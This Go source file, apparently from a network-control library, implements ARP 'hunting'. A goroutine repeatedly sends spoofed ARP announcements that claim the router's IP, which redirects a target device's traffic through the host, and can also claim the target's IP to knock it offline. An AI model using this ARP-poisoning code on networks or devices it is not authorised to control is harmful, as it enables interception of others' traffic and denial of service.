package arp

import (
	"fmt"
	"net"
	"time"

	"github.com/irai/packet"
)

func (h *Handler) findHuntByIP(ip net.IP) (packet.Addr, bool) {
	for _, v := range h.huntList {
		if v.IP.Equal(ip) {
			return v, true
		}
	}
	return packet.Addr{}, false
}

// StartHunt implements PacketProcessor interface
//
// ARP StartHunt performs the following:
//  1. add addr to "hunt" list
//  2. start spoof goroutine to which will continuously spoof the client ARP table
//
func (h *Handler) StartHunt(addr packet.Addr) (packet.HuntStage, error) {
	if addr.MAC == nil || addr.IP.To4() == nil {
		return packet.StageNoChange, packet.ErrInvalidIP
	}

	h.arpMutex.Lock()
	defer h.arpMutex.Unlock()
	if _, found := h.huntList[string(addr.MAC)]; found {
		return packet.StageHunt, nil
	}
	h.huntList[string(addr.MAC)] = addr

	fmt.Printf("arp   : start hunt %s\n", addr)
	go h.spoofLoop(addr)
	return packet.StageHunt, nil
}

// StopHunt implements PacketProcessor interface
// ARP StopHunt will remove the addr from the hunt list which will terminate the hunting goroutine
func (h *Handler) StopHunt(addr packet.Addr) (packet.HuntStage, error) {
	h.arpMutex.Lock()
	_, hunting := h.huntList[string(addr.MAC)]
	if hunting {
		delete(h.huntList, string(addr.MAC))
	}
	h.arpMutex.Unlock()
	if !hunting {
		fmt.Println("arp   : hunt stop failed - not in hunt stage", addr)
	}
	fmt.Println("arp   : stop hunt", addr)
	return packet.StageNormal, nil
}

// spoofLoop attacks the client with ARP attacks
//
// It will continuously send a number of ARP packets to client:
//   1. spoof the client arp table to send router packets to us
//   2. optionally, claim the ownership of the IP to force client to change IP or go offline
//
func (h *Handler) spoofLoop(addr packet.Addr) {

	// The client ARP table is refreshed often and only last for a short while (few minutes)
	// 4 second re-arp seem to be adequate;
	// To make sure the cache stays poisoned, replay every few seconds with a loop.
	// Experimented with 300ms but no noticeable improvement other the chatty net.
	ticker := time.NewTicker(time.Second * 6).C
	startTime := time.Now()
	nTimes := 0
	for {
		h.arpMutex.Lock()
		targetAddr, hunting := h.findHuntByIP(addr.IP)
		h.arpMutex.Unlock()

		if !hunting || h.closed {
			fmt.Printf("arp   : hunt loop stop %s repeat=%v duration=%v\n", addr, nTimes, time.Since(startTime))
			// clear the arp table
			if err := h.request(addr.MAC, h.session.NICInfo.RouterAddr4, packet.Addr{MAC: EthernetBroadcast, IP: h.session.NICInfo.RouterAddr4.IP}); err != nil {
				fmt.Printf("arp error send announcement packet %s: %s\n", addr, err)
			}
			return
		}

		// Re-arp target to change router to host so all traffic comes to us
		// Announce to target that we own the router IP
		// This will update the target arp table with our mac
		// i.e. tell target I am 192.168.0.1
		//
		// Use virtual IP as it is guaranteed to not change.
		err := h.AnnounceTo(targetAddr.MAC, h.session.NICInfo.RouterIP4.IP)
		if err != nil {
			fmt.Printf("arp   : error send announcement packet %s: %s\n", targetAddr, err)
			return
		}

		if nTimes%16 == 0 {
			fmt.Printf("arp   : hunt loop attack %s repeat=%v duration=%s\n", targetAddr, nTimes, time.Since(startTime))
		}
		nTimes++

		select {
		case <-h.closeChan:
			return
		case <-ticker:
		}
	}
}
